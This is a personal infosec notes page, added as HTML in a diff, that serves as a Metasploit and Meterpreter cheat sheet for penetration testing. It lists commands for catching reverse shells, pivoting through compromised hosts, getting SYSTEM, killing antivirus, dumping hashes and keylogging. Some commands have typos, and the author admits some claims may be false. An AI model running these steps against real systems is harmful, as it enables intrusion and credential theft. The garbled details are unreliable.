@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=6078930006c3c674839d81302710732ce523e3ba">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Metasploit | Henry Earl</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Metasploit" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Henry Earl’s InfoSec Repo" />
+<meta property="og:description" content="Henry Earl’s InfoSec Repo" />
+<link rel="canonical" href="http://localhost:4000/docs/HowToDocs/CISA/metasploit.html" />
+<meta property="og:url" content="http://localhost:4000/docs/HowToDocs/CISA/metasploit.html" />
+<meta property="og:site_name" content="Henry Earl" />
+<script type="application/ld+json">
+{"@type":"WebPage","headline":"Metasploit","url":"http://localhost:4000/docs/HowToDocs/CISA/metasploit.html","description":"Henry Earl’s InfoSec Repo","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Henry Earl</h1>
+        </a>
+        <h2>Henry Earl's InfoSec Repo</h2>
+
+        <section id="downloads">
+          
+          <nav class="horizontalNAV">
+            <a href="/docs/aboutme" class="btn">About Me</a>
+            <a href="/docs/HowToDocs/" class="btn">HowToDocs</a>
+            <a href="https://www.youtube.com/channel/UCsmRRdk_D0C1f5Dt4n-8kJw?view_as=subscriber" class="btn">YouTube</a>
+            <a href="https://twitter.com/AoXHenryEarl" class="btn">Twitter</a>
+            <a href="https://www.twitch.tv/1amhenryearl" class="btn">Twitch</a>
+          
+          <a href="https://github.com/HenryEarl/HenryEarl.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </nav>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="metasploit">Metasploit</h2>
+<h6 id="commands">Commands</h6>
+<p>show options for the payload.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show targets
+show options
+</code></pre></div></div>
+<p>A common module is the ‘exploit/multi/handler’ module which is used to handle payloads. For example, if you launch an exploit outside of Metasploit, this module can be used to set up a payload that listens for and handles incoming reverse TCP connections on the specified port and host.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+</code></pre></div></div>
+<p>Particularly when you are located on a different subnet, you may not be able to access all of the targets included in the customer scope. Once you compromise hosts that may have routes to other targets, you can utilize the Metasploit ‘route’ command in conjunction with a SOCKS4 proxy to route traffic through open sessions (i.e. from your phishing campaign or other exploitation).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route add "destination ip" "subnet" "session ?"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/server/socs4a
+</code></pre></div></div>
+<p>Set the srvhost:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set srvhost "local for most cases"
+</code></pre></div></div>
+<p>Set the srvport:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set srvport "port"
+</code></pre></div></div>
+<p>Now you can start the proxy server.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run
+</code></pre></div></div>
+<p>Once you have set up the route and proxy server in Metasploit, you can use proxychains or modify your connection settings in your browser for SOCKS4 proxy configuration: Use the GUI network configuration guide to setup a SOCKS local host listener on your configured port. Double Check for Socks 4.</p>
+
+<p>I think the portfwd command that creates a relay from the local host to the destination host will work for certain situations.</p>
+
+<h2 id="meterpreter">Meterpreter</h2>
+<p>Suggest post exploitation paths</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/multi/recon/local_exploit_suggester
+</code></pre></div></div>
+<p>Get Administrator</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getsystem
+</code></pre></div></div>
+<p>Drop into a command prompt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+
+<p>Creates relay from a meterpreter session</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>portfwd add -l 22 -p 22 -r 10.20.170.87
+</code></pre></div></div>
+
+<h6 id="systeminfo">Systeminfo</h6>
+<p>Check the system and current process that the session is running as. I had an issue where the exploit gave me a x86 (WOW64 32 bit) shell and the privesc needed x64 (64bit).
+^ This statement might be completely false lol ^</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysinfo
+</code></pre></div></div>
+
+<h6 id="i-am-not-sure-if-this-migrated-me-to-a-x86-process-always-check-with-sysinfo">I am not sure if this migrated me to a (x86) process. Always check with sysinfo.</h6>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/windows/manage/migrate
+</code></pre></div></div>
+
+<h6 id="core-commands">Core Commands</h6>
+<p>Background the meterpreter session</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>background
+</code></pre></div></div>
+<p>Bring that meterpreter session to the foreground. Trick here is hitting tab to see available sessions.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>session -i "session id"
+</code></pre></div></div>
+
+<p>Meterpreter Scripts</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>killav
+metsvc
+migrate
+netenum
+prefetchtool
+vnc_oneport / vnc
+sheduleme
+winenum
+credcollect
+get_local_subnets
+getcountermeasure
+getgui
+gettelnet
+hashdump
+keylogrecorder
+checkvm
+</code></pre></div></div>
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
